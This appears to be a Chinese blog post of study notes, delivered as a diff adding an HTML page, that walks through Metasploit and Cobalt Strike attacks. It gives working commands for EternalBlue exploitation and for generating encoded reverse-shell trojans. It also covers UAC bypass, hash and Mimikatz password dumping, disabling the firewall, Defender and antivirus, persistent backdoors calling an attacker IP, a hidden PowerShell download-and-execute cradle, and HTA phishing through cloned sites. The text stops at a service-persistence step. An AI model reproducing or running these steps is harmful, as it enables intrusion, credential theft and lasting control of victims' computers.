@@ -1,0 +1,744 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>攻击框架 | 逍 遥 の B l o g</title><meta name="keywords" content="MSF,CS"><meta name="author" content="XiaoYao"><meta name="copyright" content="XiaoYao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MSF与CS两个框架的基础攻击流程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻击框架">
+<meta property="og:url" content="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/">
+<meta property="og:site_name" content="逍 遥 の B l o g">
+<meta property="og:description" content="MSF与CS两个框架的基础攻击流程">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/028.jpg">
+<meta property="article:published_time" content="2023-03-30T13:01:15.568Z">
+<meta property="article:modified_time" content="2021-03-26T16:00:00.000Z">
+<meta property="article:author" content="XiaoYao">
+<meta property="article:tag" content="MSF">
+<meta property="article:tag" content="CS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/028.jpg"><link rel="shortcut icon" href="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/favicon_hacker.png"><link rel="canonical" href="https://w4xiaoyao.top/2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: XiaoYao","link":"Link: ","source":"Source: 逍 遥 の B l o g","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source."}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '攻击框架',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-27 00:00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
+    })(window)</script><type="text/css" href="/css/mycss.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img_struct4blog/profile_knife.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">68</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archive</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> Game1</span></a></li><li><a class="site-page child" href="/gamee/"><i class="fa-fw fas fa-gamepad"></i><span> Game2</span></a></li><li><a class="site-page child" href="/gameee/"><i class="fa-fw fas fa-gamepad"></i><span> Game3</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Myblog/img4post/cutecity/028.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逍 遥 の B l o g</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archive</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw far fa-images"></i><span> Gallery</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> Game1</span></a></li><li><a class="site-page child" href="/gamee/"><i class="fa-fw fas fa-gamepad"></i><span> Game2</span></a></li><li><a class="site-page child" href="/gameee/"><i class="fa-fw fas fa-gamepad"></i><span> Game3</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻击框架</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-30T13:01:15.568Z" title="Created 2023-03-30 21:01:15">2023-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-03-26T16:00:00.000Z" title="Updated 2021-03-27 00:00:00">2021-03-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>14min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻击框架"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>使用新版本的kali，旧版本106无法用，新版本需要vm15以上才可以用</p>
+<p>metasploit 攻击框架</p>
+<p>msfconsole 打开msf  exploits溢出，漏洞； auxiliary辅助，搜集等；nops(No Operation or Next Operation)；post后期渗透模块</p>
+<p>nmap -sV 192.168.1.17靶机ip   大概对目标进行扫描，扫描目标主机的端口上运行的软件版本，顺带扫带端口</p>
+<p>显示filtered表示对方有防火墙过滤</p>
+<p>永恒之蓝漏洞   一旦扫描到目标是win7 135 445开放端口就有可能被利用</p>
+<p>metasploit中含有各种漏洞的各种利用方式</p>
+<p>永恒之蓝对应的漏洞是ms17-010   （别的漏洞比如古怪地鼠，翡翠纤维……也可利用）</p>
+<p>google：影子经纪人 泄露这批漏洞</p>
+<p>msf攻击目标所需条件：</p>
+<p>1.知道对方有漏洞</p>
+<p>2.攻击载荷（木马病毒，自己开发比较好）</p>
+<h3 id="msf-开启"><a href="#msf-开启" class="headerlink" title="msf 开启"></a>msf 开启</h3><p>use exploit（s） ，旧版本会显示加载失败</p>
+<p>display中aix是针对IBM机器的漏洞，multi是多平台，比如浏览器上的flash，http协议的漏洞，misc加密类型的漏洞，osx上safari浏览器的漏洞，solaris系统的漏洞，window的rdp远程桌面的漏洞等，</p>
+<p>use exploit/windows/smb/</p>
+<p>use exploit/windows/smb/ms17_010_eternalblue  使用该漏洞</p>
+<p>show options 查看如何配置漏洞</p>
+<p>set RHOSTS  [目标ip]   设置目标ip</p>
+<p>默认自带攻击载荷（容易被抓）</p>
+<p>run  运行  显示win表示成功，meterpreter表示已经拿到控制权</p>
+<p>默认的木马功能挺多，使用help查看功能，比如：</p>
+<p>shell 返回控制窗口exit退出shell</p>
+<p>screenshot 抓取屏幕</p>
+<p>exit退出msf</p>
+<hr>
+<h3 id="msf木马操作标准流程"><a href="#msf木马操作标准流程" class="headerlink" title="msf木马操作标准流程"></a>msf木马操作标准流程</h3><p>msf多数利用在内网渗透</p>
+<p>在root目录下（也可以在msf环境中）生成exe木马</p>
+<p>msfvenom(毒液，msf生成木马) -a x86 -platform windows -p(payload攻击载荷) windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=4444  -b “\00”(对程序中00进行处理) -e（encode加密编码）（用后面的进行伪装，伪装也不好用了） x86/shikata_ga_nai -f exe &gt; msf.exe（生成并加密程序）</p>
+<p>将生成的木马发给目标主机（火绒瞬间处理掉。。。）</p>
+<p>进入msf，建立木马的控制端：</p>
+<p>msfconsole </p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/reverse_tcp (这里需要设置和木马中匹配的漏洞)</p>
+<p>show options</p>
+<p>set LHOST [自己ip]</p>
+<p>exploit （进入监听状态）</p>
+<p>如果木马上线就就会连接我，这边会显示meterpreter，输入shell就可以获取目标cmd</p>
+<p>退出meterpreter时exit是关闭木马，后台木马是background，生成session</p>
+<p>使用sessions查看控制了多少人</p>
+<p>sessions -i 1 进入1号主机的控制端</p>
+<p>jobs 查看当前在执行多少工作，有时候用好几种攻击方式一起放在后台工作，就会产生job</p>
+<p>back 后退一格，这时就可在msf后端做别的任务，使用sessions还可以查看当前攻击列表</p>
+<p>如果不小心exit木马，从use exploit/multi/handler开始，使用exploit开始监听</p>
+<hr>
+<h3 id="生成其他木马命令"><a href="#生成其他木马命令" class="headerlink" title="生成其他木马命令"></a>生成其他木马命令</h3><p><strong>生成mac木马：</strong></p>
+<p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho(生成什么类型的) -o payload.macho</p>
+<p>这个是比较老版本的苹果木马（苹果比较先进）</p>
+<p>生成android木马（需要数字签名）：（）其实用kali做木马本身就很蠢）</p>
+<p>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp  LHOST=自己ip LPORT=4444 -f apk -o payload.apk</p>
+<p>生成powershell木马，（windows的powershell做的越往后面越像高级的cmd）所以也有针对此的木马</p>
+<p>msfvenom -a x86 –platform windows -p windows/powershell_reverse_tcp LHOST =自己ip  LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1</p>
+<p><strong>生成linux的：</strong></p>
+<p>msfvenom -a x86 –platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f elf -o payload.elf</p>
+<p>生成python木马（攻击载荷这里都是开源的，linux自带python，可以对开源的载荷进行修改）：</p>
+<p>msfvenom -p python/meterpreter/reverse_tcp LHOST=自己ip LPORT=4444 -f raw -o payload.py</p>
+<p>冰山一角</p>
+<hr>
+<p>sessions -i 1  进入之前的木马</p>
+<p>介绍meterpreter操作</p>
+<p>除了之前的shell，screenshot之外</p>
+<h3 id="meterpreter基本操作"><a href="#meterpreter基本操作" class="headerlink" title="meterpreter基本操作"></a>meterpreter基本操作</h3><p>getuid   查看木马当前权限</p>
+<p>getsystem 直接提权（有风险，有可能会报错，被发现，也有可能因为权限不够提权，导致function不被support，即被发现）</p>
+<p><strong>UAC提权：</strong>（用户账户控制，这个权限越高，越会通知东西）</p>
+<p>利用一个针对UAC的漏洞进行提权</p>
+<p>考虑使用ask模块提权</p>
+<p> background  木马进入后台 用sessions命令查看</p>
+<p>use exploit/windows/local/ask  加载ask模块</p>
+<p>info 查看漏洞信息</p>
+<p>show options</p>
+<p>set SESSION 2  使用进程2的木马（就是之前的木马）</p>
+<p>set FILENAME qq.exe 伪装成qq</p>
+<p>set LHOST 自己ip</p>
+<p>exploit  运行，会在用户桌面上弹出一个允许qq启动，用户选择yes，成功（演示从a普通用户提权到管理员权限）</p>
+<p>此时getuid发现不是system，再用getsystem提高到最高</p>
+<hr>
+<p><strong>uac绕过提权</strong>（成功率不高）</p>
+<p>use exploit/windows/local/bypassuac (多用来攻击32位系统)</p>
+<p>show options</p>
+<p>set SESSION 1</p>
+<p>exploit 开始攻击</p>
+<p>如果攻击成功会给你一个新的session号</p>
+<p>（在win7版本中需要目标用户有一个administrator的身份才可以，而且UAC不能一直是最高，这是截至目前发现的）</p>
+<p>进入新的session号</p>
+<p>getuid</p>
+<p>getsystem</p>
+<p>一般msf这个放在公网上可以打掉一大部分电脑，SESSION部分没有图像化界面，操作不过来，所以更多用来做定向攻击</p>
+<hr>
+<h3 id="msf攻击流程"><a href="#msf攻击流程" class="headerlink" title="msf攻击流程"></a>msf攻击流程</h3><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><pre><code>kali-1
+    生成简单的木马
+    msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=[自己端口] -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe &gt; msf.exe
+
+kali-2
+    msfconsole
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set lhost [自己ip]
+    set lport [自己端口]
+    exploit 开始监听
+
+background 退到后台
+sessions 查看被控端
+sessions -i [id] 控制哪一台
+jobs 查看当前后台任务
+back 后退一格
+
+-------------------
+</code></pre>
+<h4 id="提高程序运行级别"><a href="#提高程序运行级别" class="headerlink" title="提高程序运行级别"></a>提高程序运行级别</h4><pre><code>    getuid 查看当前用户名
+
+    getsystem 直接提权
+
+background
+use exploit/windows/local/ask 加载ask模块
+info 查看用途
+set session [id]
+set filename [qq.exe]
+exploit 执行
+
+-----------------
+
+UAC绕过（不一定有效）
+    use exploit/windows/local/bypassuac
+    set sesssion [id]
+    exploit
+
+    getuid
+    getsystem
+
+-----------------
+</code></pre>
+<h4 id="查看本地提权漏洞"><a href="#查看本地提权漏洞" class="headerlink" title="查看本地提权漏洞"></a>查看本地提权漏洞</h4><pre><code>    use post/multi/recon/local_exploit.....
+    使用漏洞建议模块
+    set session [id]
+    run
+
+---------------
+</code></pre>
+<h4 id="目标信息搜集"><a href="#目标信息搜集" class="headerlink" title="目标信息搜集"></a>目标信息搜集</h4><pre><code>    sessions -i [id]
+
+    run post/windows/gather/.....
+
+    run scraper 导出所有信息
+    ~/.msf4/logs/scripts/scraper/[目标ip]
+
+    run winenum 搜集系统信息（环境变量）
+
+--------------
+</code></pre>
+<h4 id="信息嗅探"><a href="#信息嗅探" class="headerlink" title="信息嗅探"></a>信息嗅探</h4><pre><code>    load sniffer 加载嗅探模块
+    sniffer_interfaces 枚举所有网卡信息
+    sniffer_start 2 开始监听2号网卡
+    sniffer_dump 2 2.cap 数据包捕获到/root/2.cap
+
+    background
+    use auxiliary/sniffer/psnuffls
+    show options
+    set pcapfile /root/2.cap
+    exploirt 对数据包进行解包
+
+-------------
+</code></pre>
+<h4 id="关闭防火墙开启3389"><a href="#关闭防火墙开启3389" class="headerlink" title="关闭防火墙开启3389"></a>关闭防火墙开启3389</h4><pre><code>netsh advfirewall set allprofiles state off
+
+net stop windefend
+
+关闭dep
+bcdeit.exe /set &#123;current&#125; nx AlwaysOff
+
+kali
+run killav
+run post/windows/manage/killav
+
+开启远程桌面
+run post/windows/manage/enable_rdp
+run getgui -e 
+
+开启远程桌面并且创建一个新用户
+run getgui -u username -p password
+
+开启远程桌面并且绑定8888端口
+run getgui -e -f 8888
+
+kali远程连接桌面
+rdesktop -u 用户名 -p 密码 [目标ip]
+
+-------------------------
+</code></pre>
+<h4 id="植入永久后门"><a href="#植入永久后门" class="headerlink" title="植入永久后门"></a>植入永久后门</h4><pre><code>通过服务启动
+
+run metsvc -A
+
+background---jobs可以看到一个监听
+use exploit/multi/handler
+set payload windows/metsvc_bind_tcp
+set RHOST [目标ip]
+set LPORT 31337
+exploit
+
+启动型后门
+
+run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
+或
+run persistence -X -i 60 -p 4321 -r [黑客ip]
+</code></pre>
+<hr>
+<h3 id="github上msf附加的东西"><a href="#github上msf附加的东西" class="headerlink" title="github上msf附加的东西"></a>github上msf附加的东西</h3><p>做关于免杀的东西</p>
+<p>比如，the fat rat胖老鼠，标星4.9k的那个，本质上是一个后门生成器</p>
+<h4 id="the-fat-rat"><a href="#the-fat-rat" class="headerlink" title="the fat rat"></a>the fat rat</h4><p>根据文档安装</p>
+<p>直接在kali上git clone……</p>
+<p>https:// github.com/Screetsec/TheFatRat 实战要把源码进行改造，否则分钟被抓到</p>
+<p>youtube.com/watch?v=lg10XojT84M</p>
+<p>如果对安卓感兴趣可以参考下面大佬</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/M4sc3r4n0/Evil-Droid">https://github.com/M4sc3r4n0/Evil-Droid</a></p>
+<p><a target="_blank" rel="noopener" href="http://github.com/jbreed/apkin">http://github.com/jbreed/apkin</a></p>
+<hr>
+<h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><pre><code>java开发  多人协作
+
+--------------------
+流程
+    攻击机上：./teamserver 攻击机ip  攻击机密码
+    本机：./cobaltstrike   使用该启动器启动   exe后缀是win平台使用
+    连接teamserver ，写入密码
+
+    新建listener ，add ,payload(使用哪种方法监听器上线，beacon http)
+    host rotation strategy(默认round-robin)
+    http host 是攻击机ip    右下代理，增加被溯源难度
+
+    attacks——web drive-by——script web deliver
+    powershell use x64
+    生成攻击载荷
+    在目标机器cmd中运行 powershell.exe -nop -w hidden -c &quot;IEX ((new-object web.client).downloadstring(&#39;http://listener的ip:80/a&#39;))&quot;
+
+    目标上线
+    sleep，心跳
+    右键 interact     shell ipconfig    help查看可执行命令
+
+
+
+
+
+
+------------------
+</code></pre>
+<h3 id="cs模块介绍"><a href="#cs模块介绍" class="headerlink" title="cs模块介绍"></a>cs模块介绍</h3><pre><code> attacks-packages-payload generator生成木马源码，自己做免杀，自己写个shellcode luncher
+
+
+-----------------
+beacon功能（右键）
+    elevate svc-exe 提权
+        hashdump 
+        shell net user
+        run ipconfig  run与shell功能一样
+        powershell mkdir 123
+        powerpick mkdir 123 不通过powershell执行命令，效果一样
+        powershell-import ./xxx.ps1 把某个ps脚本加载内存中，再使用powershell运行
+        execute notepad在后台执行记事本
+
+    access-runMimikatz     logonpasswords  因系统而言
+    access-makeToken  password这里不用管，hash也行 伪装某个用户执行命令，如果该用户是域控，可以模拟生成令牌
+    
+    explore-net view 可以看到目标所在内网的其他主机，发现共享域，可直接在beacon中 net localgroup,net computers,net domain_trusts, net logons,查看登录，net share查看共享
+    explore-process list 查看目标主机的进程，可以找个系统进程注入payload进去，和msf开局类似，内存运行时删不了文件，,inject ,log keystrokes,view中打开键盘记录视图查看，对全局有效，，
+    explore-browser pivot 劫持目标ie浏览器，在目标主机上开启一个代理，通过本地浏览器劫持目标的cookie实现免登陆效果
+    explore-desktop vnc 打开远程窗口图形化界面操作，传输比较慢不推荐使用
+    explore-port scan 
+    
+    pivoting-socks server 以肉鸡的某个端口 的进程 做pivoting代理，入侵该内网的其他主机
+    pivoting-listener 联机控制 在肉鸡上设置第二个listener，作为跳板攻击内网其他机器
+    
+    spawn 模块派发shell
+    用spawn这个模块发指定权限的一个shell给别的兄弟，通过rundll32.exe实现
+
+-------------------
+常用命令
+    getprivs获取当前肉鸡beacon的所有权限，和shell whoami /priv
+
+
+
+-------------------------
+</code></pre>
+<h3 id="aggresor脚本"><a href="#aggresor脚本" class="headerlink" title="aggresor脚本"></a>aggresor脚本</h3><pre><code>sleep语言，对cs的二次开发 .cna文件
+命令
+    help
+    e定义 e $a=&quot;haha&quot;
+    x 输出x $a
+    load 加载
+    tron 开启函数跟踪，执行到什么位置
+    ls 查看已加载  如果修改完，直接reload 列表ls中的相同名称的文件
+语法
+    % 字典
+    @数组
+    foreach $var (@arr1)&#123;
+        println($var);
+    &#125;
+    ------------------------
+
+        @arr1 = @(&#39;a1&#39;,&#39;a2&#39;,887);
+        println(@arr1[1]);
+    保存为t1.cna  缩进
+    在script console(利用java解释器)中load /root/t1.cna 实现交互
+    java -jar sleep.jar(没在腾讯课堂中给)
+    -----------------------
+        $x = 2;
+        %dic[&quot;key1&quot;] = &quot;value1&quot;;
+        %dic[&quot;key2&quot;] = &quot;value2&quot;;
+        %dic[$x] = &quot;value3&quot;;
+        println(&quot;%dic is&quot;.%dic[&quot;key2&quot;]);
+    ----------------------- 
+    交互命令创建
+        sub fun1&#123;
+            println(&quot;run fun1!!!!now $1&quot;);
+        &#125;
+        command mingling &#123;
+            fun1($1);
+        &#125;
+
+    reload t1.cna
+    在script console中输入 mingling diaoyongfun1
+    此时mingling这个命令直接注册到ls列表中，在console使用help可查看
+ ------------------------
+ c2客户端
+    设置快捷键
+    bind Ctrl+O &#123;
+      show_message(&quot;this is a alert, bind to ctrl+o with bind&quot;);
+      elog(&quot;i am log,print log to the event log window&quot;);
+    &#125;
+
+    添加菜单
+    popup caidan&#123;
+        item(&quot;&amp;item1&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;);
+        separator();
+        item(&quot;&amp;item2&quot;,&#123;url_open(&quot;http://www.cctv.com&quot;)&#125;);
+        separator();
+        item(&quot;&amp;item3&quot;,&#123;show_message(&quot;please pay for it~&quot;)&#125;)
+    &#125;
+    menubar(&quot;my caidanname&quot;,&quot;caidan1&quot;);  绑定到上面的popup函数
+
+    添加到右键目标菜单
+    popup beacon_bottom&#123;
+        menu &quot;attack&quot;&#123;
+            item(&quot;&amp;item1&quot;,&#123;url_open(&quot;http://www.baidu.com&quot;)&#125;);
+            item(&quot;&amp;item2&quot;,&#123;show_message(&quot;how are you&quot;)&#125;)
+        &#125;
+    &#125;
+
+    github搜cna脚本，拓展cs功能
+
+
+    ------------------------------------------------------
+    cs中的数据模型(数据接口)
+
+        targets      存储的目标信息    显示上线过的主机信息
+        archives     显示最近的信息    显示最近的输出信息，慎用很卡
+        beacons      显示所有的受感染的主机信息   显示在线和上线过的主机
+        credentials  显示凭据信息      我们抓取过的密码信息和制作的票据信息
+        downloads    显示下载信息      显示我们在受控端下载的信息
+        keystrokes   记录键盘输入      当我们选择进程记录键盘的时候，会将得到的键盘信息记录下来
+        screenshots  屏幕截屏显示      显示我们截图的二进制信息流
+        sites        托管的资产        看起来是我们创建的监听的端口stager回连的端口 
+
+    -----------------
+    x  targets()  显示目标信息
+    x  targets()[0]  数组结构
+    x  targets()[0][&#39;name&#39;] 字典类型
+    x  beacons()
+
+    cna中
+    command showme&#123;
+        println(&quot;ip address is:&quot;.targets()[$1][&quot;address&quot;].&quot;\n os is&quot;.targets()[$1][&quot;os&quot;]);
+    &#125;
+
+    reload name.cna
+    showme
+    =====================
+</code></pre>
+<h3 id="clonesite-钓鱼"><a href="#clonesite-钓鱼" class="headerlink" title="clonesite 钓鱼"></a>clonesite 钓鱼</h3><pre><code>    attacks-packages-html application    exe,powershell都可 ，生成hta文件，
+    attacks-web driveby hostfile  选择hta文件，local url名字也改为hta，获得下载地址
+    后面只需要让目标访问即可，
+    目标使用ie浏览器，打开，弹窗可以隐藏，肉鸡即可上线
+
+    web driveby  clonesite    这种方法还挺多的
+    clone url http://www.baidu.com https不行
+    如果是内网可以配合arp欺骗
+    attack选择hta的那个
+
+============================
+</code></pre>
+<h3 id="服务权限维持"><a href="#服务权限维持" class="headerlink" title="服务权限维持"></a>服务权限维持</h3><pre><code>    beacon在内存中容易被发现
+    伪装
+    win：注册表，启动项，计划任务，服务，shift，放大镜，其他安装的软件
+    肉鸡上线后，
+    attack-packages-windows executable(s)   生成第二个木马exe，作为我们二段跳，
+
+    upload /root/b.exe，(之后可以设置b.exe运行后自动删除)可把该exe程序放到c:\windows\temp\ 
+    将其写到服务中
+    shell sc creat &quot;thisserver&quot; binpath=&quot;c:\windows\temp\b.exe&quot; 创建服务并关联
